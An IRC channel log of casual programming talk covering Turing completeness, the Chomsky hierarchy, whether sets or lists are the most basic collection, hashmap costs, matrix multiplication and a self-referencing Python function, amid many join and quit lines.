[00:00:10] <GeDaMo> My client only displays join/part messages if someone has spoken in the last half hour
[00:00:17] *** Quits: scoobydoo (~scooby@user/scoobydoo) (Remote host closed the connection)
[00:00:27] <GeDaMo> Although it seems to display all the nick changes 
[00:00:30] <pyzozord> wish irssi could do that
[00:00:50] *** Joins: scoobydoo (~scooby@user/scoobydoo)
[00:01:41] *** Joins: koo5_ (~quassel@51.140.155.227)
[00:01:44] <[itchyjunk]> you can script to do it
[00:01:53] <[itchyjunk]> i had something like that on my irssi back when i used it
[00:01:56] <pyzozord> i don't like perl
[00:02:02] <[itchyjunk]> ah
[00:02:15] <[itchyjunk]> can't you write it in JS then compile it to perl?
[00:02:26] <[itchyjunk]> thought theoritical CS taught us we could do this
[00:02:33] *** Quits: joe_colben (~joe____co@185.190.112.211) (Remote host closed the connection)
[00:02:34] <pyzozord> maybe it would be possible
[00:02:35] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Ping timeout: 268 seconds)
[00:02:43] <pyzozord> but I think I'd sooner write my own irc client
[00:02:47] *** Joins: control-z (~control-z@user/control-z)
[00:02:51] <[itchyjunk]> i think it was in the #proglangdesign channel that i was talking about it actually, not here
[00:02:53] *** Joins: joe_colben (~joe____co@185.190.112.211)
[00:02:55] <pyzozord> that invest time in js->perl transpiler
[00:03:40] *** Joins: ghost64 (~ghost64@user/ghost64)
[00:04:01] *** Parts: control-z (~control-z@user/control-z) (The Lounge - https://thelounge.chat)
[00:04:15] <pyzozord> well they are all turing complete so theoretically they can all be translated to each other albeit some in a more round about way than others
[00:04:49] <pyzozord> the joins/parts/quits ignore now works
[00:05:05] <ProfSimm> pyzozord: turing completenes permits that you can implement one into the other, but translation is not guaranteed.
[00:05:06] *** Joins: JCHammons[m] (~jchbitmas@2001:470:69fc:105::8350)
[00:05:25] <ProfSimm> pyzozord: a bit like, you can't explain colors to a blind person
[00:05:56] *** Joins: Jupp_S (~quassel@ip-88-153-154-129.hsi04.unitymediagroup.de)
[00:06:03] <[itchyjunk]> i think turing complete does allow it
[00:06:12] <pyzozord> I think turing completenes by definition guarantess translation
[00:06:15] <[itchyjunk]> since code A and B can both run in a universal turing machine
[00:06:53] <pyzozord> except you know to translate javascript to c you will need to include a c-written js vm
[00:06:53] *** Quits: maxzor (~maxzor@2a01cb04054faa001c7dac944e140668.ipv6.abo.wanadoo.fr) (Ping timeout: 268 seconds)
[00:07:09] <pyzozord> at least the runtime part
[00:07:15] <ProfSimm> Well translation subsumes reimplementation, but it's like cheating.
[00:07:36] <pyzozord> it wouldn't be reimplementation perse, you'd have JS_Object *foo
[00:07:40] <pyzozord> so no actual js syntax
[00:07:45] *** Joins: xsperry (~xs@user/xsperry)
[00:07:47] *** Joins: monkey_ (~user@190.104.116.153)
[00:07:51] <pyzozord> that's like half cheating
[00:07:52] <ProfSimm> Hmm well.
[00:07:56] *** Joins: jelly (jelly@user/jelly)
[00:08:09] <ProfSimm> Yes you can skip the "human syntax" part.
[00:08:18] <ProfSimm> Except no you can't, because you need eval()
[00:08:23] <pyzozord> ahh no joins, no quits. Such peacefull living. I was thinking about doing that for a long time
[00:08:35] <pyzozord> ProfSimm: hahah true
[00:08:42] <pyzozord> then full on cheating of reimplementation
[00:09:20] <pyzozord> you can translate everything to c except you still need to have eval and real js vm
[00:09:40] <[itchyjunk]> apparently pyzozord was right. if htey are aboth turing complete, they can be compiled to each other
[00:09:48] <[itchyjunk]> <Athas> If they are Turing-complete, yes.
[00:09:49] <[itchyjunk]> <Athas> B can be compiled to A iff B is not higher in the Chomsky hierarchy.
[00:09:55] * [itchyjunk] googles chomsky hierarchy now
[00:10:17] <pyzozord> it's the regular, context-free, context-sensitive thing
[00:10:27] <ProfSimm> Chomsky's the best
[00:11:16] <GeDaMo> (Turing machine (pushdown automata ( finite automata (combinatorial logic))))
[00:11:45] *** Parts: bugweiser (~tc@user/denofre) ()
[00:12:09] <[itchyjunk]> oh that thing
[00:12:10] <user51> that's some funny lisp right there
[00:12:13] <[itchyjunk]> i've seen pictures of it
[00:12:38] *** Quits: CodeSpelunker (~CodeSpelu@user/codespelunker) (Quit: CodeSpelunker)
[00:12:46] *** Joins: pavonia (~user@user/siracusa)
[00:13:04] <GeDaMo> https://en.wikipedia.org/wiki/File:Automata_theory.svg
[00:13:04] <bayaz> Title: File:Automata theory.svg - Wikipedia 
[00:14:12] *** Quits: Inline (~Inline@aftr-37-201-240-204.unity-media.net) (Quit: Leaving)
[00:14:47] *** pizzaiolo is now known as pizza
[00:15:28] <[itchyjunk]> okay i vaguely understand but also my head exploded
[00:15:57] <[itchyjunk]> the futamura projections things is pretty neat even though i can't understand it
[00:16:35] <GeDaMo> The first projection is pretty simple, it gets a bit mind bendy after that :P
[00:16:43] *** Reign`___ is now known as Reign
[00:17:01] <[itchyjunk]> I can't remember any of it for now
[00:17:08] <[itchyjunk]> i'll re-read it some day 
[00:17:16] <GeDaMo> http://blog.sigfpe.com/2009/05/three-projections-of-doctor-futamura.html
[00:17:17] <bayaz> Title: A Neighborhood of Infinity: The Three Projections of Doctor Futamura 
[00:17:19] <ProfSimm> Folks what would be the common ancestor to the "list", "set" and "map"
[00:17:45] <[itchyjunk]> depends on implementation, Objects for java
[00:17:56] <[itchyjunk]> actually, collections first
[00:17:56] <ProfSimm> Well I mean abstractly.
[00:17:59] *** Cyp_ is now known as Cyp
[00:18:13] <ProfSimm> Let's say you want to represent set/list/map as one thing.
[00:18:14] *** Cyp is now known as Cyp_
[00:18:17] <ProfSimm> What would it be like
[00:18:18] <[itchyjunk]> depends on the formalization
[00:18:32] <GeDaMo> An Array?
[00:18:33] *** Cyp_ is now known as Cyp
[00:18:34] <[itchyjunk]> set is the most abstract thing in set theory, its catagories in category theory
[00:18:37] <ProfSimm> I was hoping for some mathematical basis, like lamdba calculus
[00:18:51] <GeDaMo> Lua's tables are fairly general, a nested key:value type
[00:18:54] <pyzozord> ow I was googling "futumara" but it's futamura"
[00:18:55] <[itchyjunk]> you have some category of simply typed lambda calculus
[00:19:35] <[itchyjunk]> It's kinda impressive that the programminglanguagedesign channel has so many type theorists type people
[00:19:39] <GeDaMo> They're abstract data types with different properties and operations
[00:20:00] <[itchyjunk]> well, does Array have ordering?
[00:20:12] <GeDaMo> Yes
[00:20:21] <[itchyjunk]> Sets already don't have order so Array would be specialization of Sets in the way i am thinking of it
[00:20:26] <[itchyjunk]> Sets -> Arrays
[00:20:27] <ProfSimm> [itchyjunk]: yes
[00:20:30] *** Quits: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com) (Ping timeout: 260 seconds)
[00:20:32] *** Joins: maxzor (~maxzor@2a01cb04054faa0019a1450716269dba.ipv6.abo.wanadoo.fr)
[00:20:36] <ProfSimm> I think it's simpler to present everything as having an order.
[00:20:53] <ProfSimm> Sets may not have semantical order but it's good of they have SOME order, like, alphabetical or whatever
[00:21:04] <ProfSimm> So that it's stable when you iterate and so on
[00:21:11] <ProfSimm> Also when you produce B-trees and so on
[00:21:13] <GeDaMo> Sets don't depend on order, that doesn't mean they /can't/ be ordered
[00:21:18] *** Joins: jellyknight (~gelignite@55d4e4de.access.ecotel.net)
[00:21:40] <[itchyjunk]> if they have ordering, they are ordered sets
[00:21:42] <ProfSimm> GeDaMo: the problem is that things that don't depend on order in the abstract have no way to be implemented without order of iteration.
[00:21:46] <[itchyjunk]> which is a stronger condition than sets
[00:21:52] *** Joins: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com)
[00:21:53] <[itchyjunk]> at least from naive set theory pov
[00:22:03] <ProfSimm> GeDaMo: hence why object iteration in JS was unordered for example, but became formalized and ordered to avoid compatibility issues and bugs
[00:22:16] <[itchyjunk]> sets are the least structure you can get
[00:22:17] *** Joins: Inline (~Inline@aftr-37-201-240-204.unity-media.net)
[00:22:33] <[itchyjunk]> anything else you do probably involves operation on them or adding structure to them
[00:22:43] <ProfSimm> And if we agree that you can't have NO ORDER because you need it for iteration, then sets are no longer the simplest structure
[00:23:11] <[itchyjunk]> well, they aren't wrt practical implimentaiton
[00:23:20] <[itchyjunk]> how are sets implemented in programming languages?
[00:23:24] <ProfSimm> The simplest structure would maybe be something like a list you can only append to.
[00:23:25] <[itchyjunk]> actuall i'll ask it elsewhere
[00:23:26] *** Joins: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com)
[00:23:38] <ProfSimm> [itchyjunk]: they're basically maps without values 
[00:24:05] <ProfSimm> Implementing sets means also you need uniqueness check, which is again an extra implementation burden
[00:24:09] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Ping timeout: 268 seconds)
[00:24:20] <ProfSimm> so I think the simplest thing is a list
[00:24:34] <[itchyjunk]> oh maps without keys you mean?
[00:24:36] <[itchyjunk]> interesting
[00:24:43] <ProfSimm> Maps without values, only keys
[00:24:49] <ProfSimm> The keys are the set element
[00:24:55] <[itchyjunk]> hmm
[00:25:08] <[itchyjunk]> say you have a set S implemented
[00:25:09] <ProfSimm> Well they don't call them keys usually, but that's what they are technically 
[00:25:13] <[itchyjunk]> how do you check if s /in S ?
[00:25:39] <ProfSimm> [itchyjunk]: in a map you'd do  map.has(key) and in a set you do set.has(thing)
[00:25:46] <ProfSimm> Basically same API as keys
[00:26:10] <ProfSimm> In fact in Java you can project a map's keys to a set.
[00:26:37] <ProfSimm> So both remain linked, i.e. if you remove an element from the set, you delete it from the map
[00:26:46] *** Joins: flakland (~flaknet99@32.211.211.39)
[00:27:04] <[itchyjunk]> idk how map.has(key) works either
[00:27:21] <ProfSimm> [itchyjunk]: do you know how a hashmap works
[00:27:26] <[itchyjunk]> does it keep an array of keys?
[00:27:30] <ProfSimm> Yes
[00:27:47] <[itchyjunk]> ah so you need array as underlying structure?
[00:27:51] <[itchyjunk]> that makes more sense
[00:27:57] <ProfSimm> Of course for very small sets/maps, it's as fast to simply have a list and iterate it looking for what you want.
[00:28:14] <ProfSimm> Sophisticated implementations adapt between multiple strategies
[00:29:14] <ProfSimm> But I'm thinking a list is the base structure, and imposing one specific order on the list and imposing unique constraint are extra on top of that.
[00:29:23] <ProfSimm> So implementation-wise set is not the simplest thing.
[00:29:26] <flakland> why do they ignore array resize time in the hash map "time complexity"
[00:29:26] <ProfSimm> Unless..
[00:29:36] <ProfSimm> You can't walk a set, but that would be a somewhat useless set.
[00:29:43] *** Joins: AbleBacon (~AbleBacon@user/AbleBacon)
[00:29:44] *** spiced_marmot is now known as zvijezda
[00:30:01] <ProfSimm> How do you check what's in a set of you can't iterate it. By testing for all possible values it may have
[00:30:03] <ProfSimm> ?
[00:30:14] <ProfSimm> It's problematic.
[00:32:21] <Athas> flakland: if you implement the resize heuristics carefully, the time becomes amortised over many operations.
[00:32:47] *** Joins: surgeon[m] (~surge9nma@2001:470:69fc:105::f585)
[00:32:53] <Athas> Basically, they report the *average* complexity over many operations, not the worst case for a single operation.
[00:33:10] *** Joins: hnOsmium0001[m] (~hnosmium0@2001:470:69fc:105::15d4)
[00:33:10] *** Joins: Dave[m] (~fiseeyeem@2001:470:69fc:105::7c4a)
[00:33:24] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[00:33:36] *** Joins: flakland (~flaknet99@32.211.211.39)
[00:33:36] *** Joins: spokojni[m] (~spokojnio@2001:470:69fc:105::1:3fb2)
[00:34:05] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Ping timeout: 256 seconds)
[00:34:57] *** Quits: BurumaSerafuku (~sjw@69.206.48.64) (Remote host closed the connection)
[00:35:27] *** Joins: newpy (~newpy@206.168.231.90)
[00:35:47] *** Quits: rtypo (~alex@user/rtypo) (Ping timeout: 256 seconds)
[00:36:09] *** Joins: BurumaSerafuku (~sjw@69.206.48.64)
[00:36:33] *** Joins: Alpha3031[m] (~alpha3031@wikipedia/alpha3031)
[00:36:52] *** Joins: lexano[m] (~lexanomat@2001:470:69fc:105::3110)
[00:37:05] *** Joins: NoGare[m] (~nogaremat@2001:470:69fc:105::35f2)
[00:37:26] *** Joins: twomoon (~twomoon@ip72-199-116-21.sd.sd.cox.net)
[00:37:28] *** Joins: hoochmonger (~hoochmong@user/hoochmonger)
[00:37:31] *** Joins: kmh (~kmh@2a00:6020:5004:6800:9d7b:9dc9:6c46:c2cd)
[00:38:47] *** Quits: user51 (~user51@176.228.148.215) (Remote host closed the connection)
[00:38:51] *** Quits: zer0bitz__ (~zer0bitz@196.244.192.57) (Read error: Connection reset by peer)
[00:39:47] *** Joins: k60 (~k60fmapme@2001:470:69fc:105::1:5597)
[00:39:57] *** Joins: julian[m]123 (~julianjul@2001:470:69fc:105::1:428f)
[00:40:51] *** Joins: bmahe[m] (~bmahematr@2001:470:69fc:105::d140)
[00:44:39] *** Joins: Amp[m] (~amperture@2001:470:69fc:105::1:3535)
[00:44:39] *** Joins: lettuce[m] (~kinduffma@2001:470:69fc:105::1:5e09)
[00:45:57] *** Quits: rickybob (~rickybob@gateway/vpn/pia/rickybob) (Ping timeout: 240 seconds)
[00:46:04] *** Joins: Pickchea (~private@user/pickchea)
[00:47:30] <Decker> [itchyjunk] have you used SortBy on wolfram?
[00:48:47] <[itchyjunk]> I have not
[00:48:54] <[itchyjunk]> how does it work and for what does it work?
[00:48:58] <Decker> do you know what a nonatomic function is?
[00:49:52] *** Joins: federico_it (~textual@151.34.11.93)
[00:50:02] <Decker> https://reference.wolfram.com/language/ref/SortBy.html
[00:50:04] <bayaz> Title: SortBy?Wolfram Language Documentation 
[00:50:53] <Athas> Anyone got a suggestion for an even mildly interesting problem that can be solved with matrix multiplication and transposition?
[00:51:15] *** Joins: cthulchu (~Cthulchu@184-090-172-137.res.spectrum.com)
[00:51:25] *** Quits: cthulchu (~Cthulchu@184-090-172-137.res.spectrum.com) (Read error: Connection reset by peer)
[00:51:37] <GeDaMo> Something to do with cellular automata?
[00:51:38] *** Joins: cthulchu (~Cthulchu@184-090-172-137.res.spectrum.com)
[00:51:58] *** Quits: danielrparks_ (~quassel@2600:1700:3f7b:20f:c308:eb80:d97c:aae) (Quit: No Ping reply in 180 seconds.)
[00:52:17] <ProfSimm> This is actually a problem.
[00:52:26] <ProfSimm> In what order to you iterate an unordered collection
[00:52:41] <ProfSimm> so that there's no chance you become dependent on the order
[00:53:17] *** Joins: danielrparks (~quassel@2600:1700:3f7b:20f:633a:15c4:4784:e28a)
[00:54:17] *** EtherNet_ is now known as EtherNet
[00:54:33] *** Quits: GeDaMo (~GeDaMo@user/gedamo) (Remote host closed the connection)
[00:54:42] <ProfSimm> You'd need to intentionally obfuscate the order
[00:54:45] *** Quits: monkey_ (~user@190.104.116.153) (Remote host closed the connection)
[00:59:20] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[01:00:08] *** Joins: akselmo (~akselmo@user/akselmo)
[01:02:23] *** Joins: jokoon (~eio@2a01:e0a:542:e160:a036:c333:5055:e361)
[01:03:20] *** Joins: potatoxel[m] (~potatoxel@2001:470:69fc:105::f026)
[01:03:23] *** Joins: paoda[m] (~paodamatr@2001:470:69fc:105::9247)
[01:03:52] *** Joins: audiobirb (~audio@user/audio)
[01:03:58] *** Joins: cornedor[m] (~cornedorm@2001:470:69fc:105::ffd7)
[01:04:13] *** Quits: jellyknight (~gelignite@55d4e4de.access.ecotel.net) (Quit: Stay safe!)
[01:05:50] <pyzozord> Ai?
[01:06:18] <pyzozord> Re interesting problems with matrix
[01:07:13] <flakland> i forget what matrix transpose does, maybe a puzzle solver
[01:07:42] *** Quits: palasso (~palasso@user/palasso) (Quit: I am not a quitter!)
[01:07:58] <pyzozord> Rotates the matrix
[01:08:06] *** Quits: reynir1 (root@user/reynir) (Ping timeout: 260 seconds)
[01:08:13] <pyzozord> Like physically grabs it and turns it sideways
[01:08:54] <[itchyjunk]> transposes the rows and colums
[01:09:22] <[itchyjunk]> look at this example someone game me to explain implimentation of set
[01:09:23] <[itchyjunk]> https://bpa.st/VF7Q
[01:09:24] <bayaz> Title: View paste VF7Q 
[01:09:28] *** Quits: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com) (Quit: ThePhilgrim)
[01:09:40] <[itchyjunk]> craziest thing ever. i understand it too i think. so neat
[01:09:44] *** Joins: Themis3000 (~Thunderbi@user/themis3000)
[01:09:46] *** Joins: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com)
[01:09:51] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[01:09:57] <pyzozord> Very useful since matrices can only do dot product A x B * B x A
[01:10:15] <pyzozord> Where first one is height second one width of the matrix
[01:11:13] *** Akuli is now known as Akuli[testing]
[01:11:18] *** Akuli[testing] is now known as Akuli
[01:12:27] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[01:13:27] <[itchyjunk]> well there is a relationship between matrix multiplication and dot product
[01:13:35] <l2ftsnek>  https://imgur.com/a/lqAl7zw
[01:13:36] <[itchyjunk]> i wouldn't say matrix can only do dot product
[01:13:51] <[itchyjunk]> dot product is an operation defined on vectors
[01:14:06] *** Joins: blackcatmaxy (~blackcatm@2001:470:69fc:105::bae5)
[01:14:09] *** Joins: ZombieMaster[m] (~zombiemas@2001:470:69fc:105::1:e4d)
[01:14:28] *** Joins: davidk156305 (~davidk156@2001:470:69fc:105::1:484e)
[01:16:17] *** Quits: terminalpusher (~terminalp@2a01:586:8db1:1:5f76:20cc:55c7:b3a0) (Remote host closed the connection)
[01:16:51] *** Joins: dovi[m] (~dovifully@2001:470:69fc:105::1:2bd9)
[01:18:03] <pyzozord> Yes matrix multiplication uses many dot products
[01:18:54] *** Quits: dovi[m] (~dovifully@2001:470:69fc:105::1:2bd9) (Read error: Connection reset by peer)
[01:18:54] *** Quits: davidk156305 (~davidk156@2001:470:69fc:105::1:484e) (Read error: Connection reset by peer)
[01:18:54] *** Quits: cornedor[m] (~cornedorm@2001:470:69fc:105::ffd7) (Remote host closed the connection)
[01:18:54] *** Quits: ZombieMaster[m] (~zombiemas@2001:470:69fc:105::1:e4d) (Read error: Connection reset by peer)
[01:18:54] *** Quits: blackcatmaxy (~blackcatm@2001:470:69fc:105::bae5) (Read error: Connection reset by peer)
[01:18:54] *** Quits: potatoxel[m] (~potatoxel@2001:470:69fc:105::f026) (Write error: Connection reset by peer)
[01:18:54] *** Quits: paoda[m] (~paodamatr@2001:470:69fc:105::9247) (Write error: Connection reset by peer)
[01:18:55] *** Quits: JCHammons[m] (~jchbitmas@2001:470:69fc:105::8350) (Write error: Connection reset by peer)
[01:18:55] *** Quits: Amp[m] (~amperture@2001:470:69fc:105::1:3535) (Remote host closed the connection)
[01:18:55] *** Quits: akselmo (~akselmo@user/akselmo) (Write error: Connection reset by peer)
[01:18:55] *** Quits: NoGare[m] (~nogaremat@2001:470:69fc:105::35f2) (Read error: Connection reset by peer)
[01:18:55] *** Quits: trms[m] (~trmsmatri@2001:470:69fc:105::1:28d2) (Read error: Connection reset by peer)
[01:18:56] *** Quits: spokojni[m] (~spokojnio@2001:470:69fc:105::1:3fb2) (Write error: Connection reset by peer)
[01:18:57] *** Quits: julian[m]123 (~julianjul@2001:470:69fc:105::1:428f) (Remote host closed the connection)
[01:18:57] *** Quits: bmahe[m] (~bmahematr@2001:470:69fc:105::d140) (Read error: Connection reset by peer)
[01:18:57] *** Quits: lexano[m] (~lexanomat@2001:470:69fc:105::3110) (Remote host closed the connection)
[01:18:58] *** Quits: lettuce[m] (~kinduffma@2001:470:69fc:105::1:5e09) (Write error: Connection reset by peer)
[01:18:58] *** Quits: Alpha3031[m] (~alpha3031@wikipedia/alpha3031) (Write error: Connection reset by peer)
[01:18:58] *** Quits: Dave[m] (~fiseeyeem@2001:470:69fc:105::7c4a) (Read error: Connection reset by peer)
[01:18:59] *** Quits: k60 (~k60fmapme@2001:470:69fc:105::1:5597) (Write error: Connection reset by peer)
[01:18:59] *** Quits: surgeon[m] (~surge9nma@2001:470:69fc:105::f585) (Read error: Connection reset by peer)
[01:18:59] *** Quits: hnOsmium0001[m] (~hnosmium0@2001:470:69fc:105::15d4) (Read error: Connection reset by peer)
[01:18:59] *** Quits: nworb (~zbrownm]@2001:470:69fc:105::1:33db) (Read error: Connection reset by peer)
[01:19:40] <flakland> looks like matrix just got transposed
[01:21:04] *** Joins: saltrocklamp[m] (~hexology@user/hexology)
[01:22:55] <pyzozord> Well nothing like reading definition of dot product as bed time stories
[01:22:55] *** Joins: ForeverNoob[m] (~foreverno@2001:470:69fc:105::8c6)
[01:22:55] *** Joins: Dave[m]1 (~fiseeyeem@2001:470:69fc:105::7c4a)
[01:23:07] *** Joins: scubagear[m] (~scubagear@2001:470:69fc:105::1:5dee)
[01:23:08] *** Joins: NoGare[m] (~nogaremat@2001:470:69fc:105::35f2)
[01:23:08] *** Joins: hsiktas[m] (~hsiktasma@2001:470:69fc:105::30d4)
[01:23:20] *** Joins: kinduff[m] (~kinduffma@2001:470:69fc:105::1:5e09)
[01:23:20] *** Joins: potatoxel[m] (~potatoxel@2001:470:69fc:105::f026)
[01:23:27] <[itchyjunk]> matrix multiplciation looks like dot products
[01:23:36] *** Joins: lexano[m] (~lexanomat@2001:470:69fc:105::3110)
[01:23:36] *** Joins: psydroid (~psydroid@user/psydroid)
[01:23:36] *** Joins: Alpha3031[m] (~alpha3031@wikipedia/alpha3031)
[01:23:51] *** Joins: bmahe[m] (~bmahematr@2001:470:69fc:105::d140)
[01:23:51] *** Joins: dovi[m] (~dovifully@2001:470:69fc:105::1:2bd9)
[01:23:51] *** Joins: jinsun_ (~jinsun@user/jinsun)
[01:23:51] *** Joins: sillymob[m] (~sillymobm@2001:470:69fc:105::1:3c6d)
[01:23:51] *** Joins: nworb (~zbrownm]@2001:470:69fc:105::1:33db)
[01:23:52] <[itchyjunk]> matrix mult is kinda it's own thing
[01:23:58] <[itchyjunk]> operations between matrices
[01:24:03] *** Joins: cornedor[m] (~cornedorm@2001:470:69fc:105::ffd7)
[01:24:05] *** Joins: hnOsmium0001[m] (~hnosmium0@2001:470:69fc:105::15d4)
[01:24:06] <[itchyjunk]> and dot product operations between vectors
[01:24:06] *** Joins: twoten[m] (~twotensam@2001:470:69fc:105::1:55aa)
[01:24:09] *** Joins: mestre (~mestre@191.177.175.57)
[01:24:25] *** Joins: trms[m] (~trmsmatri@2001:470:69fc:105::1:28d2)
[01:24:25] *** Joins: ZombieMaster[m] (~zombiemas@2001:470:69fc:105::1:e4d)
[01:24:34] <pyzozord> Wikipedia defines matrix multiplication result for c_ij as dot product of ith row of a and jth column of b
[01:24:41] *** kzootick is now known as kzootock
[01:24:45] *** Joins: blackcatmaxy (~blackcatm@2001:470:69fc:105::bae5)
[01:24:46] *** kzootock is now known as kzootech
[01:24:49] *** Joins: dan01[m] (~dan01@2001:470:69fc:105::1:2640)
[01:24:49] *** Joins: spokojni[m] (~spokojnio@2001:470:69fc:105::1:3fb2)
[01:24:49] *** Joins: surgeon[m] (~surge9nma@2001:470:69fc:105::f585)
[01:24:52] *** Joins: nomagno (~nomagno@2001:470:69fc:105::c1f0)
[01:24:53] <nomagno> I think the netsplit is more or less over?
[01:25:03] <flakland> what netsplit
[01:25:08] *** Joins: davidk156305 (~davidk156@2001:470:69fc:105::1:484e)
[01:25:21] *** Joins: rvlobato[m] (~ronaldo@2001:470:69fc:105::219f)
[01:25:48] *** solidfox is now known as snake
[01:25:48] *** Joins: Amp[m] (~amperture@2001:470:69fc:105::1:3535)
[01:25:48] *** Joins: JCHammons[m] (~jchbitmas@2001:470:69fc:105::8350)
[01:25:49] *** Joins: freshgum[m] (~freshgum_@2001:470:69fc:105::c1a5)
[01:25:55] <[itchyjunk]> yes note that they define entries of matrices as vectors
[01:25:59] *** Joins: gloomy (~gloomy@2001:470:69fc:105::ce00)
[01:26:00] *** Joins: milia[m] (~mlliarmma@2001:470:69fc:105::1:4631)
[01:26:07] <pyzozord> It's not normal to look up definitions of matrix multiplication and dot product before bef is it?
[01:26:07] <[itchyjunk]> then they say that each row mult is a dot product
[01:26:14] <[itchyjunk]> its that context that makes the equivalence clear
[01:26:19] *** Joins: julian[m]123 (~julianjul@2001:470:69fc:105::1:428f)
[01:26:19] *** Joins: nicoty (~nicoty@user/nicoty)
[01:26:29] <[itchyjunk]> matrix mult = dot product is the wrong way to think about it
[01:26:31] *** Joins: paoda[m] (~paodamatr@2001:470:69fc:105::9247)
[01:26:40] *** Joins: k60 (~k60fmapme@2001:470:69fc:105::1:5597)
[01:26:41] *** Joins: akselmo (~akselmo@user/akselmo)
[01:26:56] <[itchyjunk]> entries of a matrix can have vectors and matrix themselves can be vectors
[01:27:12] <flakland> a 1D matrix?
[01:27:19] <pyzozord> It made sense to me, dot product takes two equal length sequences of numbers and returns a single value
[01:27:40] *** Quits: ProfSimm (~ProfSimm@87.227.196.109) (Remote host closed the connection)
[01:27:42] <[itchyjunk]> dot product is an operation between two vectors returning a scalar
[01:28:27] <pyzozord> Yes so each row of matrix a and each column if matrix be are equal length sequences
[01:28:42] <pyzozord> S/if/of/
[01:28:45] <[itchyjunk]> matrix A
[01:28:48] <pyzozord> S/be/b/
[01:28:57] <[itchyjunk]> which has vector entries of a_ij's
[01:29:14] <[itchyjunk]> if you think of it that way then sure, you can think of matrix mult as dot products
[01:29:27] <[itchyjunk]> you can define matrix mult in the absence of vectors completly
[01:29:47] <[itchyjunk]> if you defined it AS dot products, you restrict what matrix multiplication means
[01:30:02] *** Quits: vysn (~vysn@user/vysn) (Ping timeout: 260 seconds)
[01:30:04] <pyzozord> The wiki defined dot product as operation with two "sequences"
[01:30:36] *** Quits: mestre (~mestre@191.177.175.57) (Quit: Lost terminal)
[01:30:42] <[itchyjunk]> https://en.wikipedia.org/wiki/Dot_product#Definition
[01:30:43] <bayaz> Title: Dot product - Wikipedia 
[01:30:47] <[itchyjunk]> two vectors a and b.
[01:31:02] <pyzozord> takes two equal-length sequences
[01:31:13] <pyzozord> Usually vectors
[01:31:19] <pyzozord> But not necessarily
[01:31:32] <[itchyjunk]> where do you see that in definition?
[01:31:52] <pyzozord> Right at the top
[01:31:53] <pyzozord> takes two equal-length sequences of numbers (usually coordinate vectors)
[01:32:04] <[itchyjunk]> thats not the definition
[01:32:10] <[itchyjunk]> that's an intuitive explanation
[01:33:17] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[01:33:28] *** Joins: monkey_ (~user@190.104.116.153)
[01:33:38] <pyzozord> It suggests that some other sequel could be used too
[01:33:57] <[itchyjunk]> but it's not longer dot product, it's something other operation between some other structure
[01:34:19] <[itchyjunk]> dot product is an operation between 2 vectors in R^n afaik
[01:34:53] <[itchyjunk]> you can define matrix multiplication outside of vector spaces
[01:35:12] <[itchyjunk]> say quaternions, that programmers use all the time
[01:35:27] <[itchyjunk]> your definitoin wouldn't hold there, because quaternion doesn't give a field
[01:35:31] <[itchyjunk]> hence no vector space
[01:35:50] <[itchyjunk]> but you still do all the roration and trasformation via matrices in ring of quaternions
[01:36:24] <[itchyjunk]> its not a big deal i guess, just loss of information by defining it in a strict way like that
[01:37:14] <pyzozord> I don't understand "quaternion does t give a field" but gotta have some rest, tomorrow is the big day
[01:37:27] *** Quits: Akuli (~Akuli@85-76-42-63-nat.elisa-mobile.fi) (Quit: Akuli)
[01:37:30] <[itchyjunk]> quaternion is a ring
[01:37:33] <[itchyjunk]> field is a special ring
[01:37:39] <[itchyjunk]> vector spaces only exists over fields
[01:40:03] * [itchyjunk] rips hair about this russel(x) thing
[01:40:22] <[itchyjunk]> anyone else figure out why containsSelf(russell) is an infinite loop in the above problem?
[01:41:02] <sonny> which problem?
[01:41:10] <[itchyjunk]> https://bpa.st/VF7Q
[01:41:11] <bayaz> Title: View paste VF7Q 
[01:41:12] <[itchyjunk]> last line
[01:41:13] <[itchyjunk]> it's pythong
[01:42:07] <sonny> what is s() ?
[01:42:18] <[itchyjunk]> what do  you mean?
[01:42:39] <[itchyjunk]> containSelf is a higher order function
[01:42:43] *** Joins: eddof13 (~textual@2806:102e:12:4fba:54d5:85ef:67d1:ca00)
[01:42:47] <[itchyjunk]> in some sense
[01:43:09] <sonny> `def containsSelf(s): return s(s)` -- this returns the result of s()
[01:43:18] <[itchyjunk]> yes
[01:43:29] <[itchyjunk]> containsSelf takes a function as parameter
[01:43:50] <sonny> oh, didn't know python had those
[01:43:55] <[itchyjunk]> me neither
[01:44:00] <[itchyjunk]> welcome to the club
[01:44:01] *** Quits: eddof13 (~textual@2806:102e:12:4fba:54d5:85ef:67d1:ca00) (Client Quit)
[01:44:04] *** Quits: joe_colben (~joe____co@185.190.112.211) (Remote host closed the connection)
[01:44:17] *** Quits: nicoty (~nicoty@user/nicoty) (Quit: Client limit exceeded: 20000)
[01:44:18] *** Quits: NoGare[m] (~nogaremat@2001:470:69fc:105::35f2) (Quit: Client limit exceeded: 20000)
[01:44:32] <sonny> if the function and other variables share the same space, I have no clue what's going on there
[01:44:42] *** Quits: dovi[m] (~dovifully@2001:470:69fc:105::1:2bd9) (Quit: Client limit exceeded: 20000)
[01:44:44] *** Quits: hnOsmium0001[m] (~hnosmium0@2001:470:69fc:105::15d4) (Quit: Client limit exceeded: 20000)
[01:44:44] <[itchyjunk]> what do you mean?
[01:44:45] *** Quits: jokoon (~eio@2a01:e0a:542:e160:a036:c333:5055:e361) (Quit: Leaving)
[01:44:52] *** Joins: NoGare[m] (~nogaremat@2001:470:69fc:105::35f2)
[01:45:06] *** Joins: dovi[m] (~dovifully@2001:470:69fc:105::1:2bd9)
[01:45:13] <sonny> but s(s) is a loop that keeps calling itself
